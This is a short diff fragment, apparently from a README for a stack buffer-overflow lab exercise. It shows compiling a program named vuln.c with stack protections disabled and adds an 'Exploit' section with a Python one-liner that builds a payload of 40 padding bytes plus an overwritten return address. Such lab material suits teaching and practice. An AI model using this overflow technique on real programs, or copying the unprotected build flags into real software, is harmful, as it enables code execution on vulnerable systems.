@@ -4,3 +4,8 @@
 gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -g  
 ```
 
+- Exploit :
+
+```
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\x56\x11\x40\x00\x00\x00\x00\x00')" > payload.bin
+```
